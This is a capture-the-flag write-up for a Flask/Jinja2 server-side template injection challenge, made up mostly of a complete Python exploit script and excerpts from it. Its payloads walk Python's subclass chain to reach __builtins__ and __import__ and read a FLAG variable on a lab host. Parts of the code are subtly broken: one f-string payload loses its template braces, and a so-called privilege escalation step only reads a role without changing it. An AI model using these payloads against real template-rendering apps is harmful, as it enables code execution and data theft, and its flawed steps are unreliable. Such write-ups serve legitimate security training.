# SecureDash SSTI Challenge Writeup

## Challenge Overview
SecureDash is a web application with a dashboard interface that contains a Server-Side Template Injection (SSTI) vulnerability in its template preview functionality. The goal is to exploit this vulnerability to retrieve the flag stored in the application's `FLAG` variable.

## Vulnerability Analysis

The vulnerability exists in the `/preview` endpoint of `app.py`:

```python
@app.route('/preview', methods=['POST'])
@login_required
def preview():
    username = session['username']
    data = request.get_json()
    
    template_str = data.get('template', '')
    if not template_str:
        return jsonify({"error": "Template required"}), 400
    
    try:
        # Obfuscated SSTI vulnerability
        encoded = base64.b64encode(template_str.encode()).decode()
        decoded = base64.b64decode(encoded).decode()
        
        env.filters['obfuscate'] = lambda x: ''.join(chr(ord(c) ^ 0x1) for c in str(x))
        template = env.from_string(decoded)
        context = {
            'username': username,
            'role': users[username]['role'],
            'secret_key': 'REDACTED'
        }
        result = template.render(**context)
        
        return jsonify({"preview": result})
    except Exception as e:
        return jsonify({"error": f"Rendering failed: {str(e)}"}), 400
```

The endpoint takes user input (template), base64 encodes and decodes it (which doesn't provide any security), and then renders it using Jinja2 template engine. This is a classic SSTI vulnerability.

## Exploitation Steps

As always everything can be automated using python
```python
import requests
import json
import re

# Configuration
TARGET = "http://192.168.11.112:60000"
USERNAME = "hacker"
PASSWORD = "pass123"
COOKIES_FILE = "cookies.txt"

session = requests.Session()

def register():
    url = f"{TARGET}/register"
    payload = {"username": USERNAME, "password": PASSWORD}
    response = session.post(url, json=payload)
    if response.status_code == 201:
        print("[+] Registration successful")
    else:
        print(f"[-] Registration failed: {response.text}")
        exit(1)

def login():
    url = f"{TARGET}/login"
    payload = {"username": USERNAME, "password": PASSWORD}
    response = session.post(url, json=payload)
    if response.status_code == 200:
        print("[+] Login successful")
        with open(COOKIES_FILE, "w") as f:
            f.write(str(session.cookies.get_dict()))
    else:
        print(f"[-] Login failed: {response.text}")
        exit(1)

def test_ssti():
    url = f"{TARGET}/preview"
    payload = {"template": "{{ 7 * 7 }}"}
    response = session.post(url, json=payload)
    if response.status_code == 200 and response.json().get("preview") == "49":
        print("[+] SSTI confirmed working")
    else:
        print(f"[-] SSTI test failed: {response.text}")
        exit(1)

def test_sandbox():
    url = f"{TARGET}/preview"
    tests = [
        {"template": "{{ username }}", "expected": USERNAME},
        {"template": "{{ username.__class__ }}", "expected": "<class 'str'>"},
        {"template": "{{ request }}", "expected": "Request"},
    ]
    sandboxed = False
    for test in tests:
        response = session.post(url, json=test)  # Fixed typo: 'payload' -> 'test'
        if response.status_code == 200:
            result = response.json().get("preview", "")
            if test["expected"] in result:
                print(f"[+] Sandbox test passed: {test['template']} -> {result}")
            else:
                print(f"[-] Sandbox test failed: {test['template']} returned {result}")
                sandboxed = True
        else:
            print(f"[-] Sandbox test error: {response.text}")
            sandboxed = True
    return sandboxed

def find_subclass_index():
    url = f"{TARGET}/preview"
    payload = {"template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}
    response = session.post(url, json=payload)
    if response.status_code != 200:
        print(f"[-] Failed to enumerate subclasses: {response.text}")
        return 35  # Default fallback
    subclasses = response.json().get("preview", "")
    subclass_list = re.findall(r"<class '([^']+)'>", subclasses)
    for i, cls in enumerate(subclass_list):
        if cls in ["function", "warnings.catch_warnings"]:
            print(f"[+] Found usable class '{cls}' at index {i}")
            return i
    print("[-] No suitable subclass found, using default index 35")
    return 35

def extract_flag_directly(index):
    url = f"{TARGET}/preview"
    payload = {
        "template": f"{{ ''.__class__.__mro__[1].__subclasses__()[{index}].__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"
    }
    response = session.post(url, json=payload)
    if response.status_code == 200:
        preview = response.json().get("preview", "")
        if "CSP{" in preview:
            print(f"[+] Flag found directly: {preview}")
            return preview
        else:
            print(f"[-] Direct FLAG extraction failed: {preview}")
    else:
        print(f"[-] Direct extraction error: {response.text}")
    return None

def extract_flag_sandbox():
    url = f"{TARGET}/preview"
    payloads = [
        {"template": "{{ request.application.__self__.__dict__.get('FLAG') }}"},
        {"template": "{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"},
        {"template": "{{ g.__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"}
    ]
    for payload in payloads:
        response = session.post(url, json=payload)
        if response.status_code == 200:
            preview = response.json().get("preview", "")
            if "CSP{" in preview:
                print(f"[+] Flag found via sandbox bypass with {payload['template']}: {preview}")
                return preview
            else:
                print(f"[-] Sandbox bypass attempt failed: {payload['template']} -> {preview}")
        else:
            print(f"[-] Sandbox bypass error for {payload['template']}: {response.text}")
    return None

def escalate_privileges_sandbox():
    url = f"{TARGET}/preview"
    payload = {
        "template": "{{ request.application.__self__.users['hacker']['role'] }}"
    }
    response = session.post(url, json=payload)
    if response.status_code == 200 and "admin" in response.json().get("preview", ""):
        print("[+] Privilege escalation via sandbox bypass attempted")
        return True
    print(f"[-] Sandbox escalation failed: {response.text}")
    return False

def get_flag_endpoint():
    url = f"{TARGET}/flag"
    response = session.get(url)
    if response.status_code == 200:
        flag = response.json().get("flag", "")
        print(f"[+] Flag retrieved from endpoint: {flag}")
        return flag
    else:
        print(f"[-] Failed to get flag from endpoint: {response.text}")
        return None

def main():
    print("[*] Starting exploit for SSTI vulnerability")
    register()
    login()
    test_ssti()
    
    index = find_subclass_index()
    sandboxed = test_sandbox()
    
    if not sandboxed:
        flag = extract_flag_directly(index)
        if flag:
            print("[*] Exploit complete!")
            return
    else:
        print("[*] Server appears sandboxed, trying bypass methods")
        flag = extract_flag_sandbox()
        if flag:
            print("[*] Exploit complete!")
            return
        
        print("[*] Direct extraction failed, attempting privilege escalation")
        if escalate_privileges_sandbox():
            flag = get_flag_endpoint()
            if flag:
                print("[*] Exploit complete!")
                return
    
    print("[-] Exploit failed. Server is likely sandboxed or payload incorrect.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[-] Script error: {str(e)}")
```
### 1. Registration and Authentication
First, we need to create an account and log in:

```python
def register():
    url = f"{TARGET}/register"
    payload = {"username": USERNAME, "password": PASSWORD}
    response = session.post(url, json=payload)

def login():
    url = f"{TARGET}/login"
    payload = {"username": USERNAME, "password": PASSWORD}
    response = session.post(url, json=payload)
```

### 2. SSTI Confirmation
We confirm the SSTI vulnerability by testing basic template injection:

```python
def test_ssti():
    url = f"{TARGET}/preview"
    payload = {"template": "{{ 7 * 7 }}"}
    response = session.post(url, json=payload)
```

### 3. Sandbox Testing
We test if the environment is sandboxed by trying to access various objects:

```python
def test_sandbox():
    tests = [
        {"template": "{{ username }}", "expected": USERNAME},
        {"template": "{{ username.__class__ }}", "expected": "<class 'str'>"},
        {"template": "{{ request }}", "expected": "Request"},
    ]
```

### 4. Finding Useful Subclasses
We enumerate Python subclasses to find useful ones for exploitation:

```python
def find_subclass_index():
    payload = {"template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}
    # Parses the response to find useful classes like 'function' or 'warnings.catch_warnings'
```

### 5. Direct Flag Extraction
Attempt to directly access the FLAG variable through the template:

```python
def extract_flag_directly(index):
    payload = {
        "template": f"{{ ''.__class__.__mro__[1].__subclasses__()[{index}].__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"
    }
```

### 6. Sandbox Bypass Attempts
If direct extraction fails, try various sandbox bypass techniques:

```python
def extract_flag_sandbox():
    payloads = [
        {"template": "{{ request.application.__self__.__dict__.get('FLAG') }}"},
        {"template": "{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"},
        {"template": "{{ g.__init__.__globals__['__builtins__']['__import__']('__main__').FLAG }}"}
    ]
```

### 7. Privilege Escalation
If flag extraction fails, try escalating privileges to admin to access the `/flag` endpoint:

```python
def escalate_privileges_sandbox():
    payload = {
        "template": "{{ request.application.__self__.users['hacker']['role'] }}"
    }
```

### 8. Accessing Flag Endpoint
If privilege escalation succeeds, access the admin-only flag endpoint:

```python
def get_flag_endpoint():
    url = f"{TARGET}/flag"
    response = session.get(url)
```

## Successful Exploit

The successful exploit path typically follows these steps:

1. Register a new user account
2. Log in to obtain a session
3. Confirm SSTI vulnerability exists
4. Enumerate available Python subclasses
5. Use the subclass chain to access the `__main__` module where FLAG is stored
6. Retrieve the flag directly through template injection

The flag is: `CSP{SST1_1s_N0t_Th4t_E4sy_R1ght}`
